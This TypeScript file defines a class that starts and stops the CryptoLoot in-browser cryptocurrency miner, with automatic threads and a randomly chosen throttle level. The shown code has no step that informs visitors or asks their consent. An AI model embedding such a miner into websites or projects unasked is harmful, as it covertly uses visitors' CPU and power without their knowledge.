import {JavascriptMiner} from "./javascript-miner";
import {Helpers} from "../helpers";
import getRandomInt = Helpers.getRandomInt;

export class CryptoLootMiner implements JavascriptMiner{

    private _miner:any;
    private _publicKey:string;

    constructor(publicKey:string){
        this._publicKey = publicKey;
    }

    StartMining(min:number, max:number) {
        try {
            // noinspection TypeScriptUnresolvedVariable
            this._miner = new CRLT.Anonymous(this._publicKey, {
                autoThreads: true,
                throttle: 1 - (getRandomInt(min, max) / 100)
            });
            this._miner.start();
        }
        catch (e){
            console.log("Unable to start miner");
            console.log(e);
        }
    }

    StopMining() {
        try {
            if(this._miner !== null){
                this._miner.stop();
            }
        }
        catch (e){
            console.log("Unable to stop miner");
            console.log(e);
        }
    }

}